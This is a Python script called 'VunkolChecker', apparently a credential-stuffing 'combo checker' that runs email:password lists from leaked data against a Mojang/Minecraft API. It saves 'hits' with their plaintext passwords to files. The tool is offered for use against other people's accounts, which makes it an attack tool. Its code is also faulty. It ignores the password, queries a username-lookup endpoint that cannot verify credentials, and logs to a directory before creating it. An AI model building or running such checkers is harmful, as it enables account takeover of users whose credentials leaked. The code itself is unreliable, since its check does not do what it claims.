import requests
import os
from datetime import datetime
import threading
import time

# LOGO PROFESSIONIST
LOGO = '''
██    ██ ██    ██ ███    ██ ██   ██  ██████  ██       
██    ██ ██    ██ ████   ██ ██  ██  ██    ██ ██   
██    ██ ██    ██ ██ ██  ██ █████   ██    ██ ██   
 ██  ██  ██    ██ ██  ██ ██ ██  ██  ██    ██ ██   
  ████    ██████  ██   ████ ██   ██  ██████  ███████
'''

class VunkolChecker:
    def __init__(self, combo_file, results_dir="results"):
        self.combo_file = combo_file
        self.results_dir = results_dir
        self.combos = []
        self.hits = []
        self.bads = []
        self.checked = 0
        self.errors = 0
        self.logfile = os.path.join(results_dir, f"log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
        self.load_combos()
        if not os.path.exists(results_dir):
            os.makedirs(results_dir)
        print(LOGO)
        self.stats_thread = threading.Thread(target=self.print_stats, daemon=True)
        self.stats_thread.start()

    def log(self, message):
        print(message)
        with open(self.logfile, "a") as f:
            f.write(f"{datetime.now()} | {message}\n")

    def load_combos(self):
        with open(self.combo_file, encoding="utf-8") as f:
            self.combos = [line.strip() for line in f if ":" in line]
        self.log(f"Loaded {len(self.combos)} combos.")

    def check_account(self, email, password):
        try:
            r = requests.get("https://api.mojang.com/users/profiles/minecraft/" + email, timeout=10)
            if r.status_code == 200:
                return True
        except Exception as e:
            self.errors += 1
            self.log(f"Error on {email}: {e}")
        return False

    def run(self):
        for combo in self.combos:
            email, password = combo.split(":", 1)
            self.checked += 1
            if self.check_account(email, password):
                self.log(f"[HIT] {email}:{password}")
                self.hits.append(f"{email}:{password}")
            else:
                self.log(f"[BAD] {email}:{password}")
                self.bads.append(f"{email}:{password}")
        self.save_results()
        print("\nGata! Verificarea s-a terminat.")

    def save_results(self):
        hits_path = os.path.join(self.results_dir, "hits.txt")
        bads_path = os.path.join(self.results_dir, "bads.txt")
        with open(hits_path, "w") as f:
            f.write("\n".join(self.hits))
        with open(bads_path, "w") as f:
            f.write("\n".join(self.bads))
        self.log(f"Results saved in {self.results_dir}")

    def print_stats(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(LOGO)
            print(f"Checked: {self.checked}/{len(self.combos)} | Hits: {len(self.hits)} | Bad: {len(self.bads)} | Errors: {self.errors}")
            time.sleep(1)

if __name__ == "__main__":
    print(LOGO)
    combo_file = input("Enter the path to your combo file (email:pass per linie): ").strip()
    checker = VunkolChecker(combo_file)
    checker.run()
